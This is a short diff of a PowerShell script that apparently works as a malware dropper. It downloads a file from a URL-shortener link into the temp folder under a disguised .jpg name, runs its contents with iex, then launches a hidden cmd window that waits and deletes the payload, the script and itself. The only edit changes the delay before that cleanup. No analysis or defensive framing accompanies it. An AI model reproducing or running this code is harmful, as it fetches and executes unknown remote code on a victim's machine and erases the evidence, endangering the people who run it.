@@ -5,4 +5,4 @@ $url="https://surl.li/vbiwyb"
 $path="$env:TEMP\0x480x8b0x5.jpg"
 (New-Object Net.WebClient).DownloadFile($url,$path)
 iex(Get-Content $path -Raw)
-Start-Process -WindowStyle Hidden cmd -ArgumentList "/c timeout /t 75 /nobreak > nul & del /f /q $env:TEMP\04A7C1QX50.ps1 $env:TEMP\0x480x8b0x5.jpg & del /f /q %0"
+Start-Process -WindowStyle Hidden cmd -ArgumentList "/c timeout /t 70 /nobreak > nul & del /f /q $env:TEMP\04A7C1QX50.ps1 $env:TEMP\0x480x8b0x5.jpg & del /f /q %0"
